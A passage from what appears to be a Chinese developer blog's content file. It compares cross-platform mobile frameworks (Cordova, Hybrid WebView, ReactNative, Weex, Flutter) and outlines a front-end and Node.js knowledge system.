map里面</li><li>添加一个空的iframe,iframe的src则指向gap://ready</li><li>3的iframe的src设置以后，NATIVE侧UIWebviewDelegate#shouldStartLoadWithRequest则被呼出来</li><li>Webview的Delegatet判断gap://ready的情况下，则执行commandDelegate的处理</li><li>commandDelegate则从JS侧取出API的参数，内部实现则是通过 UIWebview＃stringByEvaluatingJavaScriptFromString的返回值 取得CommandQueue里面的参数转换成JSON数据</li><li>根据6的插件，执行NATIVE定义的插件实例</li><li>插件中，有CALLBACK的情况下，成功失败的结果通过UIWebview＃stringByEvaluatingJavaScriptFromString执行JS，JS端则根据传过来的CALLBACKID，从callbacks map取出回调函数并执行</li></ol></li><li><p>通信方式</p><ul><li>iframe的方法（默认）</li><li>xmlHttpRequest的方法（iOS5.x版本因为 -webkit-scroll的IFRAME有BUG，则推荐使用）</li></ul></li><li><p>插件导入流程</p><ul><li><p>Native</p><ul><li>APP启动，MainViewController初始化之时，queue和command的DELEGATE初期化</li><li>config.xml文件解析，插件名设置到数组，插件文件和插件名设置到pluginMap,属性设置到setting</li><li>在Webview类里面，加载index.html,index.html里面加载cordova.js、开始初期化</li></ul></li><li><p>JS</p><ul><li>加载cordova.js时、内部的事件设置模块，NATIVE交互模块，初期化模块，插件加载</li><li>插件模块是cordova_plugins.js文件定义的插件文件地址，文件名保存的MAP</li><li>deviceready事件发布后，插件的API可以使用了</li><li>插件API执行后，模块MAP将插件文件加载，执行exec函数</li><li>在index.html里面添加一个空的iframe、指定src=gap://ready，通知到Nativie</li></ul></li></ul></li></ul><h4 id="优势-1"><a href="#优势-1" class="headerlink" title="优势"></a>优势</h4><ul><li>iOS和Android基本上可以共用代码；</li><li>纯web思维，开发速度快，  简单方便，一次编码，到处运行；</li><li>如果熟悉web开发，文档很全，  系统级支持封装较好，所有UI组件都是有html模拟，可以统一  使用；</li><li>可实现在线更新，允许动态加载web js；</li><li>文档多，开发者多，遇到问题容易解决，技术成熟；</li></ul><h4 id="劣势-1"><a href="#劣势-1" class="headerlink" title="劣势"></a>劣势</h4><ul><li>占用内存高一些；</li><li>不适合做游戏类型app；</li><li>web技术午无法解决一 切问题，对于比较耗能的地方无法利用native的思维实现优势互 补，如高体验的交互，动画等。</li></ul><h2 id="Hybrid-APP（Webview）"><a href="#Hybrid-APP（Webview）" class="headerlink" title="Hybrid APP（Webview）"></a>Hybrid APP（Webview）</h2><p>利用 安卓和 iOS 上的 webview 容器，APP 能够执行 html、css 和 js 脚本，展示 web 页面。如果需要原生功能就添加 bridge 供 java 调用。具有开发效率高、跨平台、支持动态发布等特点，它是目前应用最广泛最成熟的一种方案；</p><h3 id="Webview通信"><a href="#Webview通信" class="headerlink" title="Webview通信"></a>Webview通信</h3><ul><li><p>假跳转的请求拦截（不建议）</p><ul><li>假跳转的请求拦截 就是由网页发出一条新的跳转请求，跳转的目的地是一个非法的压根就不存在的地址</li><li>比如：wbcst://testhost/action?params=xxx</li><li>模拟http协议网络请求 scheme://host/action?params</li><li>客户端会无差别拦截所有请求，真正的url地址应该照常放过，只有协议域名匹配的url地址才应该被客户端拦截</li><li>JS调用方式<ol><li>a标签跳转</li><li>location.href跳转</li><li>iframe跳转</li></ol></li><li>不建议使用，android系统对url参数做了字节限制，无法进行大数据的通信</li></ul></li><li><p>弹窗拦截（不建议）</p><ul><li>alert<ul><li>弹出个提示框，只能点确认无回调</li></ul></li><li>confirm<ul><li>弹出个确认框（确认，取消），可以回调</li></ul></li><li>prompt<ul><li>弹出个输入框，让用户输入东西，可以回调</li></ul></li><li>不建议使用，会无差别的拦截所有前端的window弹窗</li></ul></li><li><p>JS上下文注入（推荐）</p><ul><li>iOS<ul><li>WKWebView scriptMessageHandler注入</li></ul></li><li>android<ul><li>addJavascriptInterface注入</li></ul></li><li>特点<ul><li>不通过任何拦截的办法，而是直接将一个native对象（or函数）注入到JS里面，可以由web的js代码直接调用，直接操作</li></ul></li></ul></li></ul><h3 id="WebView-渲染引擎设计的上的缺陷"><a href="#WebView-渲染引擎设计的上的缺陷" class="headerlink" title="WebView 渲染引擎设计的上的缺陷"></a>WebView 渲染引擎设计的上的缺陷</h3><ul><li>JS Execute，Layout， Paint 都在MainThread ，无法并行化。</li><li>JS 的性能赶不上 Native Tookit 的 Java Dart Object-C 等编译型语言，执行复杂逻辑时会卡顿。</li><li>渲染流水线非常长，导致浏览器对合成器动画和非合成器动画区分对待，非合成器动画性能不佳。</li><li>OpenGL 设计上是推荐单线程模型，一个 Context 同时只能运行一个线程使用。 GPU Thread 运行在单独 GPU 进程， Render 进程无法访问 GPU 进程的 OpenGL Context ，两个进程无法 Texture 共享资源。 Render 进程只能输出 Bitmap/Command Buffer 通过 IPC 传递给 GPU 进程，无法直接在 GPU 进程的 Open GL Context 做直接光栅化，难以充分发挥现代 GPU 的性能。</li><li>光栅化是异步进行的，进行惯性滚动时，会出现白屏，这个是 Webview 始终无法避免的问题。</li><li>设备平台众多，需要兼容CPU渲染，无法进行 All In GPU 的设计。</li></ul><h3 id="优势-2"><a href="#优势-2" class="headerlink" title="优势"></a>优势</h3><ul><li>跨平台</li><li>开发周期短、成本低</li><li>用户体验良好</li><li>可以即时修复bug、动态发版</li></ul><h3 id="劣势-2"><a href="#劣势-2" class="headerlink" title="劣势"></a>劣势</h3><ul><li>仿原生iOS效果复杂</li><li>机型兼容性</li></ul><h2 id="ReactNative-Weex跨平台技术"><a href="#ReactNative-Weex跨平台技术" class="headerlink" title="ReactNative/Weex跨平台技术"></a>ReactNative/Weex跨平台技术</h2><p>这种技术最大化的复用前端的生态和 Native 的生态体系，把 Native View 的高性能组件积累输出给前端的技术体系。此方案和浏览器的最大区别在于 Script 的执行和 Native View 渲染体系。</p><h3 id="ReactNative"><a href="#ReactNative" class="headerlink" title="ReactNative"></a>ReactNative</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn14n5koj6j30ly0jwq5l.jpg" alt="img"></p><h4 id="通信流程（OC）"><a href="#通信流程（OC）" class="headerlink" title="通信流程（OC）"></a>通信流程（OC）</h4><ul><li>①js调用OC模块暴露出来的方法</li><li>②把调用方法分解为ModuleName、MethodName、arguments，在丢给MessageQueue处理</li><li>③把js的callback函数缓存在MessageQueue的一个成员变量里面，同时生成一个CallbackID来代表callback；在通过保存在MessageQueue的模块配置表把ModuleName、MethodName转成ModuleID、MethodID</li><li>④把ModuleID、MethodID、CallbackID和其他参数传给OC（JavaScriptCore）</li><li>⑤OC接到消息，通过模块配置表拿到对于的模块和方法</li><li>⑥RCTModuleMethod对js传过来的参数进行处理</li><li>⑦OC模块方法执行完，执行block回调</li><li>⑧调用第6步中RCTModuleMethod生成的block</li><li>⑨block带着CallbackID和block传过来的参数去掉用js里的MessageQueue方法invokeCallbackAndReturnFlushedQueue</li><li>⑩MessageQueue通过CallbackID找到相应的js的callback方法</li><li>⑪调用callback方法，并把OC带过来的参数一起传过去完成回调</li></ul><h4 id="优势-3"><a href="#优势-3" class="headerlink" title="优势"></a>优势</h4><p>虽然不能做到一次编码到处运行，但是基本上即使是两套代码，  也是相同的jsx语法， 使用js进行开发。用户体验高于html，  开发效率较高</p><p>Flexbox布局据说比native的自适应布局更加简单高效</p><h4 id="劣势-3"><a href="#劣势-3" class="headerlink" title="劣势"></a>劣势</h4><p>对开发人员要求较高，不是懂点web技术就行的，当官方封装的  控件、API无法满足需 求时就必然需要懂一些native的东西去  扩展，扩展性仍然远远不如web，也远远不如直 接写Native Code。</p><h3 id="Weex"><a href="#Weex" class="headerlink" title="Weex"></a>Weex</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn14mh3r31j30gq0ast9e.jpg" alt="img"></p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>Weex 对外通过 Rax 和 Vue 前端框架进行功能输出，前端框架下有一层 JS Framework 来实现 dom 的功能。 WeexCore 负责基础的 Flex Layout ，然后通过 Component 分别对接到 Android/iOS 的 Platform Native View 体系。</p><h4 id="优势-4"><a href="#优势-4" class="headerlink" title="优势"></a>优势</h4><ul><li>Android Native 采用更轻量级的渲染流水线，能更快更高效的的响应事件；</li><li>RenderThread 直接操作 OpenGLContext ，进行 Direct GPU Raster ，充分发挥现代 GPU 的特性，提供高性能渲染和流畅的体验；</li><li>部分耗时操作，如 Bitmap 上传 Texture ， TextureThread 上传到 Share Open GL Context 中， Texture 完成后通知主线程进行绘制，通过 Share Open GL Context 与主线程共享 Texture 等资源。 WebView 只能在 Render Process 内部进行 Texture 的共享， RenderProcess 无法与 GPU Process 共享 Texture 等资源；</li><li>Android Native 有 RecycleView ViewPager 等高级组件，每个高级组件都做了性能的最佳实践；浏览器上的高级组件只能通过 JS 模拟实现，优化定制效率低；</li><li>浏览器流水线设计复杂，需要考虑到 PC 、手机、嵌入式设备等多种复杂的环境，不少设备上木有 GPU ，只能进行 CPU 渲染。无法像 Android Native 体系一样进行 All In GPU 的体系设计，全面发挥现代 GPU 的性能。</li></ul><h4 id="劣势-4"><a href="#劣势-4" class="headerlink" title="劣势"></a>劣势</h4><p>Weex 体系充分将 Native 的 View 体系输出到前端体系中，在进行 Android/iOS Native View 的封装过程中，存在不少难以逾越的障碍</p><h2 id="Flutter自绘引擎"><a href="#Flutter自绘引擎" class="headerlink" title="Flutter自绘引擎"></a>Flutter自绘引擎</h2><p>Flutter是Google发布的一个用于创建跨平台、高性能移动应用的框架。Flutter和QT mobile一样，都没有使用原生控件，相反都实现了一个自绘引擎，使用自身的布局、绘制系统</p><h3 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn14zog2e4j30mn0ch0ti.jpg" alt="图1-1"></p><p><strong>基础架构主要分为三个部分：</strong>  </p><ul><li><p>Framework</p><ul><li>纯 Dart实现的 SDK，类似于 React在 JavaScript中的作用</li><li>它实现了一套基础库， 用于处理动画、绘图和手势</li><li>基于绘图封装了一套 UI组件库</li><li>根据 Material 和Cupertino两种视觉风格区分开来</li></ul></li><li><p>Engine</p><ul><li>纯 C++实现的 SDK</li><li>包括<ul><li>Skia引擎</li><li>Dart运行时</li><li>文字排版引擎等</li></ul></li><li>它是 Dart的一个运行时，它可以以 JIT 或者 AOT的模式运行 Dart代码</li><li>这个运行时还控制着 VSync信号的传递、GPU数据的填充等，并且还负责把客户端的事件传递到运行时中的代码</li></ul></li><li><p>Embedder</p><ul><li>Embedder是操作系统适配层</li><li>实现了<ul><li>渲染Surface设置</li><li>线程设置</li><li>平台插件等平台相关特性的适配</li></ul></li></ul></li></ul><h3 id="渲染流程"><a href="#渲染流程" class="headerlink" title="渲染流程"></a>渲染流程</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn152rff0hj30ok0kognn.jpg" alt="image-20210126154129830"></p><ul><li>GPU的VSync信号同步给到UI线程</li><li>UI线程使用Dart来构建抽象的视图结构（这里是Framework层的工作）</li><li>绘制好的抽象视图数据结构在GPU线程中进行图层合成（在Flutter Engine层的工作）</li><li>然后提供给Skia引擎渲染为GPU数据，最后通过OpenGL或者 Vulkan提供给 GPU</li></ul><h3 id="优势-5"><a href="#优势-5" class="headerlink" title="优势"></a>优势</h3><p>高生产效率。一套代码可以开发出Android和iOS应用；Dart语  言优越性，使得同样的 功能只需要很少的代码；迭代更加方便，  hot reload功能；</p><p>创建优雅的、高度可定制的用户界面。Flutter内置了对Material Design和Cupertino（iOS-favor）的UI组件库；提供了可定制  的UI组件，不再受制于OEM控件的限制；</p><p>借助可移植的GPU加速的渲染引擎以及高性能本地ARM代码运行  时以达到跨平台的高质量用户体验。</p><h3 id="劣势-5"><a href="#劣势-5" class="headerlink" title="劣势"></a>劣势</h3><p>Flutter采用Dart语言开发，属于小众语言，需要一切都要重新  学习。</p><h2 id="横向对比"><a href="#横向对比" class="headerlink" title="横向对比"></a>横向对比</h2><table><thead><tr><th>对比内容</th><th>ReactNative</th><th>weex</th><th>Flutter</th><th>Hybrid</th></tr></thead><tbody><tr><td>平台实现</td><td>JavaScript</td><td>JavaScript</td><td>原生编码</td><td>H5</td></tr><tr><td>引擎</td><td>JSCore</td><td>JS V8</td><td>Flutter Engine</td><td>Webview</td></tr><tr><td>核心语言</td><td>React</td><td>Vue</td><td>Dart</td><td>JavaScript</td></tr><tr><td>打包bundle文件</td><td>默认单一文件比较大（可拆包）</td><td>较小，多页面多文件</td><td>不需要</td><td>前端JS、CSS一般CDN引用</td></tr><tr><td>跨平台</td><td>中</td><td>中</td><td>中上</td><td>上</td></tr><tr><td>热更新</td><td>好</td><td>好</td><td>暂无方案</td><td>好</td></tr><tr><td>性能</td><td>中</td><td>中</td><td>中上</td><td>差</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 大前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flutter </tag>
            
            <tag> ReactNative </tag>
            
            <tag> Hybrid </tag>
            
            <tag> Weex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端知识体系-全栈系列</title>
      <link href="2021/02/02/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB-%E5%85%A8%E6%A0%88%E7%B3%BB%E5%88%97/"/>
      <url>2021/02/02/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB-%E5%85%A8%E6%A0%88%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h1 id="前端知识体系（图谱）"><a href="#前端知识体系（图谱）" class="headerlink" title="前端知识体系（图谱）"></a>前端知识体系（图谱）</h1><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmxgjdrrn5j317o0u0aj6.jpg" alt="前端知识体系大纲"></p><h2 id="前端工程化体系"><a href="#前端工程化体系" class="headerlink" title="前端工程化体系"></a>前端工程化体系</h2><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmxglag3f2j30u014k1ky.jpg" alt="前端工程化体系"></p><h2 id="node"><a href="#node" class="headerlink" title="node"></a>node</h2><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmxh6glc7gj30z10u0npd.jpg" alt="node"></p><h2 id="主流技术栈"><a href="#主流技术栈" class="headerlink" title="主流技术栈"></a>主流技术栈</h2><h3 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmxqy9ryiyj30u014yax4.jpg" alt="主流技术栈"></p><h3 id="React"><a href="#React" class="headerlink" title="React"></a>React</h3><p><img src="https://img.58cdn.com.cn/escstatic/docs/imgUpload/gongchenghui/React.png" alt></p><h3 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h3><p><img src="https://img.58cdn.com.cn/escstatic/docs/imgUpload/gongchenghui/Vue.png" alt="vue"></p><h3 id="Angular"><a href="#Angular" class="headerlink" title="Angular"></a>Angular</h3><p><img src="https://img.58cdn.com.cn/escstatic/docs/imgUpload/gongchenghui/angular.png" alt></p><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><p><img src="https://img.58cdn.com.cn/escstatic/docs/imgUpload/gongchenghui/JavaScript.png" alt></p><h3 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h3><p><img src="https://img.58cdn.com.cn/escstatic/docs/imgUpload/gongchenghui/TypeScript2.png" alt></p><h2 id="跨平台技术"><a href="#跨平台技术" class="headerlink" title="跨平台技术"></a>跨平台技术</h2><h3 id="大纲-1"><a href="#大纲-1" class="headerlink" title="大纲"></a>大纲</h3><p><img src="https://img.58cdn.com.cn/escstatic/docs/imgUpload/gongchenghui/%E8%B7%A8%E5%B9%B3%E5%8F%B0%E6%8A%80%E6%9C%AF.png" alt></p><h3 id="跨端技术发展的三个阶段"><a href="#跨端技术发展的三个阶段" class="headerlink" title="跨端技术发展的三个阶段"></a>跨端技术发展的三个阶段</h3><p><img src="https://img.58cdn.com.cn/escstatic/docs/imgUpload/gongchenghui/%E8%B7%A8%E7%AB%AF%E6%8A%80%E6%9C%AF%E5%8F%91%E5%B1%95.png" alt></p><h3 id="Hybrid"><a href="#Hybrid" class="headerlink" title="Hybrid"></a>Hybrid</h3><p><img src="https://img.58cdn.com.cn/escstatic/docs/imgUpload/gongchenghui/Hybrid.png" alt></p><h3 id="ReactNative"><a href="#ReactNative" class="headerlink" title="ReactNative"></a>ReactNative</h3><p><img src="https://img.58cdn.com.cn/escstatic/docs/imgUpload/gongchenghui/ReactNative.png" alt></p><h3 id="Flutter"><a href="#Flutter" class="headerlink" title="Flutter"></a>Flutter</h3><p><img src="https://img.58cdn.com.cn/escstatic/docs/imgUpload/gongchenghui/Flutter.png" alt></p><h3 id="weex"><a href="#weex" class="headerlink" title="weex"></a>weex</h3><h3 id="小程序"><a href="#小程序" class="headerlink" title="小程序"></a>小程序</h3><h3 id="快应用"><a href="#快应用" class="headerlink" title="快应用"></a>快应用</h3><h3 id="ionic"><a href="#ionic" class="headerlink" title="ionic"></a>ionic</h3><p><img src="https://img.58cdn.com.cn/escstatic/docs/imgUpload/gongchenghui/ionic.png" alt></p><h3 id="Cordova"><a href="#Cordova" class="headerlink" title="Cordova"></a>Cordova</h3><p><img src="https://img.58cdn.com.cn/escstatic/docs/imgUpload/gongchenghui/cordova.png" alt></p><h2 id="性能优化和监控"><a href="#性能优化和监控" class="headerlink" title="性能优化和监控"></a>性能优化和监控</h2><p><img src="https://img.58cdn.com.cn/escstatic/docs/imgUpload/gongchenghui/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E5%92%8C%E7%9B%91%E6%8E%A7.png" alt></p><h1 id="前端知识体系（大纲）"><a href="#前端知识体系（大纲）" class="headerlink" title="前端知识体系（大纲）"></a>前端知识体系（大纲）</h1><h2 id="前端工程化体系-1"><a href="#前端工程化体系-1" class="headerlink" title="前端工程化体系"></a>前端工程化体系</h2><h3 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h3><ul><li><p>规范化</p><ul><li><p>前端标准（基础）</p><ul><li>W3C</li><li>SPA</li><li>DOM</li><li>BOM</li><li>XHTML</li><li>XML</li><li>JSON</li><li>JSONP</li><li>HTTP</li><li>HTML5</li><li>CSS3</li></ul></li><li><p>编码规范</p><ul><li>eslint</li><li>tslint</li><li>stylelint</li></ul></li><li><p>命名规范</p><ul><li><p>Pascal 大小写</p><ul><li>组成标识符的每个单词的首字母大写，其余字母小写的书写约定。对于缩写的双字母单词，要求全部大写</li></ul></li><li><p>Camel 大小写</p><ul><li>标识符的首字母小写，每个后面连接的单词的首字母大写，其余字母小写的书写约定。对于缩写的双字母单词，要求它们出现在标识符首部时全部小写，否则全部大写</li></ul></li><li><p>匈牙利命名法</p><ul><li>变量名 = 属性 ＋ 类型 ＋ 对象描述</li></ul></li><li><p>常量的命名</p><ul><li>常量的名字应该都使用大写字母，并且指出该常量完整含义</li></ul></li></ul></li><li><p>目录规范</p></li><li><p>commit提交规范</p><ul><li>commitiizen</li><li>cz-customizable</li><li>commitlint</li></ul></li><li><p>文档规范</p></li><li><p>接口规范</p></li><li><p>流程规范</p><ul><li>gitflow</li></ul></li></ul></li><li><p>基础构建优化</p><ul><li><p>压缩</p></li><li><p>校验</p></li><li><p>资源合并</p></li><li><p>打包构建工具</p><ul><li>Browserify</li><li>webpack</li><li>gulp</li><li>rollup</li><li>grunt</li><li>…</li></ul></li><li><p>包管理工具</p><ul><li>Bower</li><li>npm</li><li>yarn</li></ul></li></ul></li><li><p>模块化</p><ul><li><p>JS模块规范</p><ul><li><p>模块规范</p><ul><li><p>AMD</p><ul><li>RequireJS</li></ul></li><li><p>CMD</p><ul><li>seaJS</li></ul></li><li><p>CommonJS</p><ul><li>node模块系统</li></ul></li><li><p>ES6+ Module</p></li></ul></li><li><p>模块加载机制原理</p></li></ul></li><li><p>CSS模块化</p><ul><li><p>css预处理器</p><ul><li><p>Less</p></li><li><p>Sass</p><ul><li>node-sass</li><li>dart-sass</li></ul></li><li><p>Stylus</p></li></ul></li><li><p>css Module</p></li><li><p>css in JS</p></li></ul></li><li><p>模块设计</p></li></ul></li><li><p>组件化</p><ul><li><p>组件化标准</p><ul><li>Web Component</li></ul></li><li><p>组件设计</p><ul><li>UI和功能拆分（独立性/自由组合）</li></ul></li><li><p>组件设计</p><ul><li>目录结构（就近维护）</li></ul></li></ul></li><li><p>资源管理</p><ul><li>按需加载</li><li>延迟加载</li><li>缓存复用</li><li>CDN部署</li><li>文件指纹</li><li>请求合并</li><li>异步同步加载</li></ul></li></ul><h3 id="工具链"><a href="#工具链" class="headerlink" title="工具链"></a>工具链</h3><ul><li><p>脚手架</p><ul><li>脚手架工具原理</li><li>命令行工作流</li><li>项目模板设计</li></ul></li><li><p>搭建本地开发环境</p></li><li><p>搭建本地mock环境</p></li><li><p>自动化构建</p><ul><li>webpack配置使用</li><li>常用插件</li><li>webpack构建性能优化</li><li>代码转换：ES与Babel</li><li>CSS预编译与postcss</li><li>模块合并：webpack模块化构建</li><li>webpack增量更新构建</li><li>资源定位</li><li>自动刷新</li></ul></li><li><p>引入单元测试</p></li><li><p>部署发布</p><ul><li>Jenkins</li><li>部署流程</li><li>静态资源部署策略</li></ul></li><li><p>监控</p><ul><li><p>行为监控</p></li><li><p>异常监控</p><ul><li>采集</li><li>用户信息</li><li>行为信息</li><li>异常信息</li><li>环境信息</li></ul></li><li><p>性能监控</p><ul><li><p>运行时监控</p><ul><li>文件级</li><li>模块级</li><li>函数级</li><li>算法级</li></ul></li><li><p>网络请求速率</p></li><li><p>系统性能</p></li></ul></li></ul></li></ul><h3 id="工作流"><a href="#工作流" class="headerlink" title="工作流"></a>工作流</h3><ul><li><p>本地工作流</p><ul><li>本地环境</li><li>代码分离</li><li>测试沙箱</li></ul></li><li><p>云平台工作流</p><ul><li><p>角色划分</p><ul><li>本地开发环境</li><li>gitlab</li><li>云平台</li></ul></li><li><p>自动化构建与部署</p><ul><li>gitflow与版本管理</li><li>webhook与自动构建</li></ul></li><li><p>持续集成与持续交付</p><ul><li>自动构建与测试</li><li>生产环境的迭代版本、版本回流</li><li>Docker容器技术</li></ul></li><li><p>IDE云平台开发</p><ul><li>IDE工具</li></ul></li></ul></li></ul><h3 id="调试工具"><a href="#调试工具" class="headerlink" title="调试工具"></a>调试工具</h3><ul><li><p>Chrome</p><ul><li><p>Element 标签页</p><ul><li>用于查看和编辑当前页面中的 HTML 和 CSS 元素</li></ul></li><li><p>Network 标签页</p><ul><li>用于查看 HTTP 请求的详细信息，如请求头、响应头及返回内容等</li></ul></li><li><p>Source 标签页</p><ul><li>用于查看和调试当前页面所加载的脚本的源文件</li></ul></li><li><p>TimeLine 标签页</p><ul><li>用于查看脚本的执行时间、页面元素渲染时间等信息</li></ul></li><li><p>Profiles 标签页</p><ul><li>用于查看 CPU 执行时间与内存占用等信息</li></ul></li><li><p>Resource 标签页</p><ul><li>用于查看当前页面所请求的资源文件，如 HTML，CSS 样式文件等</li></ul></li><li><p>Audits 标签页</p><ul><li>分析页面加载的过程，进而提供减少页面加载时间、提升响应速度的方案，用于优化前端页面，加速网页加载速度等</li></ul></li><li><p>Console 标签页</p><ul><li>用于显示脚本中所输出的调试信息，或运行测试脚本等</li></ul></li></ul></li><li><p>firefox插件Firebug</p><ul><li>Chrome浏览器出现之前常用的调试工具</li></ul></li><li><p>IE的开发者工具</p></li><li><p>IETest</p><ul><li><p>IE浏览器版本切换工具</p><ul><li>在开发Web项目的时候，经常会碰到需要在不同的IE版本中检查完成的网页是否能正常展现，这时就需要IETest帮我们模拟网页在IE5.5、IE6、IE7、IE8、IE9以及IE10等浏览器中的兼容性，让我们看一下辛苦做好的CSS样式或网站版面是否可以在各个主要浏览器正常显示</li></ul></li></ul></li><li><p>Emmet</p><ul><li>HTML/CSS开发中的神器<br><a href="https://www.emmet.io/" target="_blank" rel="noopener">https://www.emmet.io/</a></li></ul></li><li><p>JSON 格式化和校验工具</p></li><li><p>Postman</p><ul><li>用于调试请求和响应</li></ul></li><li><p>移动端抓包调试</p><ul><li>fiddler</li><li>Charles</li></ul></li></ul><h2 id="node-1"><a href="#node-1" class="headerlink" title="node"></a>node</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><ul><li><p>web服务</p><ul><li><p>express</p><ul><li>中间件、生态完善</li></ul></li><li><p>koa</p><ul><li>脱胎于express，提升异步编程体验</li></ul></li><li><p>hapi</p><ul><li>遵循配置大于编码原则，沃尔玛前端团队出品</li></ul></li><li><p>sails</p><ul><li>模仿ruby on rails框架</li></ul></li><li><p>tsw</p><ul><li>qq空间出品，集成了很多腾讯内部组件</li></ul></li><li><p>Meteor</p><ul><li>快速搭建框架、10倍的减轻工作量</li></ul></li><li><p>Feathers</p><ul><li>创建一个面向服务的架构，是一个很好地适合创建Node.js微服务</li></ul></li><li><p>Keystone</p><ul><li>Keystone是得到一个管理客户端并运行的最好的解决方案之一，以便管理来自MongoDB数据库的内容。管理界面自动从模型生成，具有所有CRUD操作和精细的过滤器。</li></ul></li><li><p>Loopback</p><ul><li>内置许多函数，包括使用令牌和到任何类型的数据库连接器的认证</li></ul></li><li><p>egg</p><ul><li>为企业级框架和应用而生，是阿里开源的企业级 Node.js 框架</li></ul></li><li><p>Daruk</p><ul><li>Daruk 是一款基于 Koa2，使用 Typescript 开发的轻量级 web 框架</li></ul></li><li><p>uma</p><ul><li>58同城node框架</li></ul></li></ul></li><li><p>模板引擎</p><ul><li>handlebars</li><li>ejs</li><li>jade</li></ul></li><li><p>前端打包</p><ul><li>webpak</li><li>fis</li></ul></li><li><p>任务管理</p><ul><li>gulp</li></ul></li><li><p>单元测试</p><ul><li>karma</li><li>mocha</li><li>jasmine</li></ul></li><li><p>包管理</p><ul><li>npm</li><li>cnpm</li><li>yarn</li></ul></li><li><p>守护进程</p><ul><li>pm2</li><li>forever</li></ul></li></ul><h3 id="三大特点"><a href="#三大特点" class="headerlink" title="三大特点"></a>三大特点</h3><ul><li><p>单线程</p><p>Node.js不为每个客户连接创建一个新的线程，而仅仅使用一个线程。当有用户连接了，就触发一个内部事件，通过非阻塞I/O、事件驱动机制，让Node.js程序宏观上也是并行的</p></li><li><p>非阻塞I/O</p><p>由于Node.js中采用了非阻塞型I/O机制，因此在执行了访问数据库的代码之后，将立即转而执行其后面的代码，把数据库返回结果的处理代码放在回调函数中，从而提高了程序的执行效率。<br>当某个I/O执行完毕时，将以事件的形式通知执行I/O操作的线程，线程执行这个事件的回调函数。为了处理异步I/O，线程必须有事件循环，不断的检查有没有未处理的事件，依次予以处理。<br>阻塞模式下，一个线程只能处理一项任务，要想提高吞吐量必须通过多线程。而非阻塞模式下，一个线程永远在执行计算操作，这个线程的CPU核心利用率永远是100%。所以，这是一种特别有哲理的解决方案：与其人多，但是好多人闲着；还不如一个人玩命，往死里干活儿。</p></li><li><p>事件驱动event-driven</p><p>在Node中，在一个时刻，只能执行一个事件回调函数，但是在执行一个事件回调函数的中途，可以转而处理其他事件（比如，又有新用户连接了），然后返回继续执行原事件的回调函数，这种处理机制，称为“事件环”机制。<br>Node.js底层是C++（V8也是C++写的）。底层代码中，近半数都用于事件队列、回调函数队列的构建</p></li></ul><h3 id="技术架构"><a href="#技术架构" class="headerlink" title="技术架构"></a>技术架构</h3><ul><li><p>底层架构</p><ul><li><p>v8 engine</p><ul><li>虚拟机的功能，执行js代码</li><li>提供C++函数接口，为nodejs提供v8初始化，创建context，scope等</li></ul></li><li><p>libuv</p><ul><li>它是基于事件驱动的异步IO模型库，我们的js代码发出请求，最终由libuv完成，而我们所设置的回调函数则是在libuv触发</li></ul></li><li><p>builtin modules</p><ul><li>它是由C++代码写成各类模块，包含了crypto，zlib, file stream etc 基础功能</li><li>v8提供了函数接口，libuv提供异步IO模型库，以及一些nodejs函数，为builtin modules提供服务</li></ul></li><li><p>native modules</p><ul><li>它是由js写成，提供我们应用程序调用的库，同时这些模块又依赖builtin modules来获取相应的服务支持</li></ul></li></ul></li><li><p>node函数调用机制</p></li></ul><h3 id="通信协议"><a href="#通信协议" class="headerlink" title="通信协议"></a>通信协议</h3><ul><li><p>网络协议</p><ul><li><p>http/https</p><ul><li>推荐request.js</li></ul></li><li><p>tcp</p><ul><li>net模块</li></ul></li><li><p>udp</p><ul><li>dgram模块</li></ul></li></ul></li><li><p>数据序列化协议</p><ul><li><p>json</p><ul><li>文本协议，常用于http通信</li></ul></li><li><p>protocol buffer</p><ul><li>二进制协议，常用于socket通信</li><li>js原生不支持，可以使用protobuf.js来解析</li></ul></li></ul></li><li><p>接口协议</p><ul><li><p>restful apis</p><ul><li>语义化，几乎所有web框架都支持</li></ul></li><li><p>Graphql</p><ul><li>解决restful接口过于原子化的缺陷，facebook出品</li><li>需要在前端和后台接口之前搭建一层graphql server做数据处理</li></ul></li><li><p>RPC</p><ul><li>后台服务间通信</li></ul></li><li><p>网络序/本地序</p><ul><li>Buffer模块api原生支持两种序列的转换</li></ul></li></ul></li></ul><h3 id="存储"><a href="#存储" class="headerlink" 